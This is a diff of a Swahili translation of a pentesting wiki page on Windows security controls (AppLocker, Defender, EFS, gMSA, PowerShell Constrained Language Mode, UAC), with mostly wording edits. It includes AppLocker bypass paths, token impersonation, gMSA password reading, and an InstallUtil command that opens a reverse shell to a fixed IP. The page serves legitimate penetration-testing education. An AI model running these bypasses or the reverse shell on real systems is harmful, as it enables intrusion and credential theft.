@@ -6,8 +6,8 @@
 
 Orodha ya programu inayoruhusiwa ni orodha ya programu za software au executable zilizothibitishwa ambazo zinaruhusiwa kuwepo na kuendesha kwenye mfumo. Lengo ni kulinda mazingira kutokana na malware hatari na programu zisizothibitishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la orodha ya programu za Microsoft** na inawapa wasimamizi wa mifumo udhibiti juu ya **ni programu na faili zipi watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executable, scripts, faili za installer za Windows, DLLs, programu zilizopakiwa, na waandishi wa programu zilizopakiwa.\
-Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwa baadhi ya directories, **lakini hii yote inaweza kupuuziliwa mbali**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **ufumbuzi wa orodha ya programu za Microsoft** na inawapa wasimamizi wa mifumo udhibiti juu ya **ni programu na faili zipi watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executable, scripts, faili za installer za Windows, DLLs, programu zilizopakiwa, na waandishi wa programu zilizopakiwa.\
+Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwenye directories fulani, **lakini hii yote inaweza kupuuziliwa mbali**.
 
 ### Check
 
@@ -26,7 +26,7 @@ Hii njia ya rejista inaelezea mipangilio na sera zinazotumika na AppLocker, ikit
 
 ### Bypass
 
-- **Mafolda yanayoweza kuandikwa** yanayotumika kupita Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **mafolda yanayoweza kuandikwa** unaweza kutumia **kupita hii**.
+- **Folda zinazoweza kuandikwa** zinazofaa kupita Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **folda zinazoweza kuandikwa** ambazo unaweza kutumia **kupita hii**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
@@ -37,8 +37,8 @@ C:\windows\tracing
 - **Kanuni zilizoandikwa vibaya zinaweza pia kupitishwa**
 - Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda inayoitwa `allowed`** mahali popote na itaruhusiwa.
 - Mashirika mara nyingi pia yanazingatia **kuzuia `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini yanasahau kuhusu **mengine** [**mikoa ya executable ya PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
-- **DLL enforcement mara chache huwekwa** kutokana na mzigo wa ziada ambao inaweza kuweka kwenye mfumo, na kiasi cha majaribio kinachohitajika kuhakikisha hakuna kitu kitaharibika. Hivyo kutumia **DLLs kama milango ya nyuma kutasaidia kupita AppLocker**.
-- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+- **DLL enforcement mara chache huwekwa** kutokana na mzigo wa ziada ambao inaweza kuweka kwenye mfumo, na kiasi cha majaribio kinachohitajika kuhakikisha hakuna kitu kitaharibika. Hivyo kutumia **DLLs kama backdoors kutasaidia kupita AppLocker**.
+- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** code katika mchakato wowote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Hifadhi ya Akida
 
@@ -67,13 +67,13 @@ LSA inaweza kuhifadhi kwenye diski baadhi ya akida:
 
 Ni hifadhidata ya Active Directory. Ipo tu katika Vikundi vya Kudhibiti.
 
-## Mlinzi
+## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika matoleo ya Windows Server. In **zuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita hizi ulinzi**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika matoleo ya Windows Server. In **zuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita ulinzi huu**.
 
 ### Angalia
 
-Ili kuangalia **hali** ya **Mlinzi** unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama inafanya kazi):
+Ili kuangalia **hali** ya **Defender** unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama inafanya kazi):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -92,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Ili kuhesabu unaweza pia kukimbia:
+Ili kuorodhesha unaweza pia kukimbia:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -107,7 +107,7 @@ EFS inalinda faili kupitia usimbaji, ikitumia **symmetric key** inayojulikana ka
 
 **Mifano ya Usimbuaji bila kuanzishwa na mtumiaji** ni pamoja na:
 
-- Wakati faili au folda zinahamishwa kwenye mfumo wa faili usio wa EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinapaswa kusimbuliwa moja kwa moja.
+- Wakati faili au folda zinahamishwa kwenye mfumo wa faili usio EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinapaswa kusimbuliwa moja kwa moja.
 - Faili zilizofichwa zinazotumwa kupitia mtandao kupitia SMB/CIFS protocol zinapaswa kusimbuliwa kabla ya usafirishaji.
 
 Njia hii ya usimbaji inaruhusu **upatikanaji wa wazi** kwa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutaruhusu usimbuaji.
@@ -121,7 +121,7 @@ Njia hii ya usimbaji inaruhusu **upatikanaji wa wazi** kwa faili zilizofichwa kw
 
 ### Angalia taarifa za EFS
 
-Angalia kama **mtumiaji** amekuwa **akitumia** huduma hii kwa kuangalia kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Angalia kama **mtumiaji** amekuwa **akitumia** huduma hii kwa kuangalia kama njia hii inapatikana:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
 Angalia **nani** ana **upatikanaji** wa faili kwa kutumia cipher /c \<file>\
 Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimbua** na **kusimbua** faili zote
@@ -130,7 +130,7 @@ Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimbua** n
 
 #### Kuwa Mamlaka ya Mfumo
 
-Njia hii inahitaji **mtumiaji wa kidhulumu** kuwa **akifanya** **mchakato** ndani ya mwenyeji. Ikiwa hiyo ni kesi, kwa kutumia `meterpreter` sessions unaweza kujifanya kuwa token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenye mchakato wa mtumiaji.
+Njia hii inahitaji **mtumiaji wa kidhulumu** kuwa **akifanya** **mchakato** ndani ya mwenyeji. Ikiwa hiyo ni kesi, kwa kutumia `meterpreter` sessions unaweza kuiga token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenye mchakato wa mtumiaji.
 
 #### Kujua nenosiri la watumiaji
 
@@ -140,19 +140,19 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Password never expire**" iliyowekwa, gMSAs hutoa suluhisho salama na linaloweza kusimamiwa zaidi:
+Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Password never expire**" iliyoanzishwa, gMSAs hutoa suluhisho salama na linaloweza kusimamiwa zaidi:
 
-- **Usimamizi wa Nenosiri wa Moja kwa Moja**: gMSAs hutumia nenosiri tata, la herufi 240 ambalo hubadilika moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya masasisho ya nenosiri ya mikono.
+- **Usimamizi wa Nenosiri wa Moja kwa Moja**: gMSAs hutumia nenosiri tata la herufi 240 ambalo hubadilika moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya masasisho ya nenosiri ya mikono.
 - **Usalama Ulioimarishwa**: Akaunti hizi hazihusiki na kufungwa na haziwezi kutumika kwa kuingia kwa mwingiliano, kuimarisha usalama wao.
 - **Msaada wa Wenyeji Wengi**: gMSAs zinaweza kushirikiwa kati ya wenyeji wengi, na kuifanya kuwa bora kwa huduma zinazofanya kazi kwenye seva nyingi.
 - **Uwezo wa Kazi Iliyopangwa**: Tofauti na akaunti za huduma zinazodhibitiwa, gMSAs zinasaidia kuendesha kazi zilizopangwa.
-- **Usimamizi wa SPN ulio Rahisishwa**: Mfumo unasasisha moja kwa moja Jina la Kitaalamu la Huduma (SPN) wakati kuna mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, kuimarisha usimamizi wa SPN.
+- **Usimamizi wa SPN ulio Rahisishwa**: Mfumo unasasisha moja kwa moja Jina la Kiongozi wa Huduma (SPN) wakati kuna mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, kuimarisha usimamizi wa SPN.
 
 Nenosiri za gMSAs zinahifadhiwa katika mali ya LDAP _**msDS-ManagedPassword**_ na zinarejeshwa moja kwa moja kila siku 30 na Wasimamizi wa Kikoa (DCs). Nenosiri hili, ambalo ni blob ya data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), linaweza kupatikana tu na wasimamizi walioidhinishwa na seva ambazo gMSAs zimewekwa, kuhakikisha mazingira salama. Ili kufikia taarifa hii, unahitaji muunganisho salama kama LDAPS, au muunganisho lazima uthibitishwe na 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-Unaweza kusoma nenosiri hili kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
+Unaweza kusoma nenosiri hili kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
@@ -170,7 +170,7 @@ Pia, angalia hii [ukurasa wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inafungia mbali nyingi ya vipengele** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu tu aina za .NET zilizothibitishwa, michakato ya XAML, madarasa ya PowerShell, na zaidi.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inafungia mbali vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu tu aina za .NET zilizothibitishwa, michakato ya XAML, madarasa ya PowerShell, na zaidi.
 
 ### **Angalia**
 ```bash
@@ -183,7 +183,7 @@ $ExecutionContext.SessionState.LanguageMode
 Powershell -version 2
 ```
 Katika Windows ya sasa, Bypass hiyo haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Ili kuikamilisha, unaweza kuhitaji** **kui** _**Ongeza Rejeleo**_ -> _Browse_ -> _Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.
+**Ili kuikamilisha unahitaji** **ku** _**ongeza Rejeleo**_ -> _Browse_ -> _Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.
 
 #### Bypass ya moja kwa moja:
 ```bash
@@ -193,7 +193,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita njia iliyozuiliwa. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Sera ya Utekelezaji wa PS
 
@@ -231,7 +231,7 @@ SSPI itakuwa na jukumu la kutafuta itifaki inayofaa kwa mashine mbili zinazotaka
 - %windir%\Windows\System32\kerberos.dll
 - **NTLMv1** na **NTLMv2**: Sababu za ulinganifu
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Seva za wavuti na LDAP, nenosiri kwa njia ya MD5 hash
+- **Digest**: Seva za wavuti na LDAP, nywila kwa njia ya MD5 hash
 - %windir%\Windows\System32\Wdigest.dll
 - **Schannel**: SSL na TLS
 - %windir%\Windows\System32\Schannel.dll
@@ -242,7 +242,8 @@ SSPI itakuwa na jukumu la kutafuta itifaki inayofaa kwa mashine mbili zinazotaka
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kipeperushi cha idhini kwa shughuli zilizoimarishwa**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli zilizoimarishwa**.
+
 
 {{#ref}}
 uac-user-account-control.md
